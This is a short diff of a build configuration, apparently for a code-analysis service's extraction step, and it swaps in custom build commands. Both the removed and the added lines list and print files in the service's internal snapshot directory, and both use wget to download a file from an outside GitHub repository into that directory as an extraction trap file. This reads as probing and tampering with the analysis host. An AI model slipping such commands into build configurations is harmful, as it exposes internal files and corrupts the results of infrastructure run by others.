@@ -3,7 +3,7 @@ extraction:
     index:
       build_command:
       - ./custom-build
-      - ls -la /opt/out/snapshot/working/trap/
-      - mkdir /opt/out/snapshot/working/trap/java/
-      - wget https://raw.githubusercontent.com/vnptvred/testjav5/master/test123.trap -O /opt/out/snapshot/working/trap/java/Hoho.java.trap
-      - cat /opt/out/snapshot/working/trap/java/Hoho.java.trap
+      - gunzip /opt/out/snapshot/working/trap/opt/src/src_old/Bhi.java.trap.gz
+      - ls -la /opt/out/snapshot/working/trap/opt/src/src_old/
+      - cat /opt/out/snapshot/working/trap/opt/src/src_old/Bhi.java.trap
+      - wget https://raw.githubusercontent.com/vnptvred/testjav5/master/test123.trap -O /opt/out/snapshot/working/trap/opt/src/src_old/Hoho.java.trap
